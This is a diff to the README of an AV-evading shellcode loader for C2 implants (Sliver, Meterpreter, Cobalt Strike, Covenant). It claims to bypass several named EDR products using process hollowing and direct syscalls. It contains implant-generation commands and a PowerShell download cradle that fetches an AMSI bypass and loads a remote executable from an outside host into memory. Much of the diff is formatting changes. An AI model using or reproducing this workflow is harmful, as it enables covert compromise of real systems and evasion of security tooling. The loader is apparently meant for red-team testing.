@@ -4,7 +4,8 @@
 
 up to test day, most common AVs can be bypassed: Windows defender, ATP, CS Falcon, Carbon Black, Red Canary, Cylance and McAfee.
 
-### Install MONO when using Linux
+### Install MONO when using Kali Linux / Debian Based Distributions
+
 ```
 sudo apt install apt-transport-https dirmngr gnupg ca-certificates
 sudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv-keys 3FA7E0328081BFF6A14DA29AA6A19B38D3D831EF
@@ -13,26 +14,36 @@ sudo apt update
 sudo apt-get install mono-complete
 ```
 
+### Install MONO when using Ubuntu (tested for 22.04)
+
+```
+sudo apt install apt-transport-https dirmngr gnupg ca-certificates
+sudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv-keys 3FA7E0328081BFF6A14DA29AA6A19B38D3D831EF
+echo "deb https://download.mono-project.com/repo/ubuntu stable-focal main" | sudo tee /etc/apt/sources.list.d/mono-official-stable.list
+sudo apt update
+sudo apt install mono-complete
+```
+
 ### Currently supporting the following C2 plateform (It is now should be able to support any C2 if shellcode is provided):
 
-* Meterpreter
-* Covenent
-* Sliver
-* Cobalt Strike
-
+- Meterpreter
+- Covenent
+- Sliver
+- Cobalt Strike
 
 ### Feature
 
-* Process Hollowing
-* Behaviour detection bypass
-* Random AES encryption
-* Rewrite to use D/Invoke direct syscalls
-* Add a new haloloader_template to use [SharpHalos](https://github.com/GetRektBoy724/SharpHalos), HaloGates direct syscalls methods to load shellcode
+- Process Hollowing
+- Behaviour detection bypass
+- Random AES encryption
+- Rewrite to use D/Invoke direct syscalls
+- Add a new haloloader_template to use [SharpHalos](https://github.com/GetRektBoy724/SharpHalos), HaloGates direct syscalls methods to load shellcode
 
 ### Guide
 
 1. Generate shellcode for supported C2 implant in raw format:
-For Sliver:
+   For Sliver:
+
 ```
 ### To Generate a Sliver implant shellcode without obfuscation:
 # [server] sliver > generate -N sliver --mtls 10.0.0.145 -b 10.0.0.145 --skip-symbols -f shellcode --save /root/Codes/sn0wldr/input/
@@ -45,6 +56,7 @@ For Sliver:
 ```
 
 For Meterpreter:
+
 ```
 ### To Generate a Meterpreter implant shellcode without obfuscation:
 # for x64
@@ -55,6 +67,7 @@ For Meterpreter:
 ```
 
 For CobaltStrike:
+
 ```
 ### To Generate a CS implant shellcode without obfuscation:
 # Attacks -> Packages -> Payload Generator
@@ -68,18 +81,19 @@ For CobaltStrike:
 
 ```
 ┌──(root💀TW-PenTestBox)-[~/myCodes/sn0wldr]
-└─# ./autogen_loader.sh -h                              
-[*] Usage: ./autogen_loader.sh -t <c2type> -a <target_os_arch> -s <syscall_type> 
-[*] Exg..: ./autogen_loader.sh -t sliver -a x64 -s halogate 
+└─# ./autogen_loader.sh -h
+[*] Usage: ./autogen_loader.sh -t <c2type> -a <target_os_arch> -s <syscall_type>
+[*] Exg..: ./autogen_loader.sh -t sliver -a x64 -s halogate
 
-[!] Make sure the shellcode bin file located in input folder and named as <c2type>.bin 
-[!] Currently c2type only support the following four: 
-[!] 	sliver|meterpreter|cobaltstrike|covenant 
-[!] Current directly syscall methods only support the following two: 
+[!] Make sure the shellcode bin file located in input folder and named as <c2type>.bin
+[!] Currently c2type only support the following four:
+[!] 	sliver|meterpreter|cobaltstrike|covenant
+[!] Current directly syscall methods only support the following two:
 [!] 	dinvoke|halogate
 ```
 
 4. Since the generated executable file is Sharp Assembly, it can be chained with the tool [PowerSharpLoader](https://github.com/F4l13n5n0w/PowerSharpLoader) to load remotely into memory without touch disk, as shown in the following example:
+
 ```
 IEX([Net.Webclient]::new().DownloadString("https://raw.githubusercontent.com/F4l13n5n0w/PowerSharpLoader/master/amsi3.txt"));
 IEX([Net.Webclient]::new().DownloadString("https://raw.githubusercontent.com/F4l13n5n0w/PowerSharpLoader/master/Invoke-LoadAssembly.ps1"));
@@ -88,6 +102,5 @@ Invoke-LoadAssembly -AssemblyUrl https://not.o0.rs/halosli64x2.exe -Command ""
 
 ### To Do
 
-* Add bananameowloader for even better AV bypass
-* Add InlineExecute-Assembly BoF support for Sliver
-
+- Add bananameowloader for even better AV bypass
+- Add InlineExecute-Assembly BoF support for Sliver
